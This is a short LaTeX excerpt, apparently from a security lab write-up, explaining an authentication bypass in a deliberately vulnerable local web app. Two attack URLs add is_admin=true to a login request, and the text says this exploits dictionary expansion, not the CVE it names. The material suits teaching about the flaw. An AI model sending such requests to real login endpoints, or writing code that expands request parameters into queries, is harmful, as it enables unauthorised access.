...
\textbf{Note:} This is NOT the CVE-2025-64459 SQL Injection vulnerability. This is a simpler dictionary expansion attack. CVE-2025-64459 is demonstrated in Vulnerability 3.
...
\begin{lstlisting}[language=bash]
# Attack URL - No password required!
http://localhost:8000/vulnerable/login/?username=attacker&is_admin=true

# Alternative with extra parameters
http://localhost:8000/vulnerable/login/?username=hacker&password=fake&is_admin=true
\end{lstlisting}
...
The attacker bypasses authentication entirely by exploiting dictionary expansion, not SQL injection.
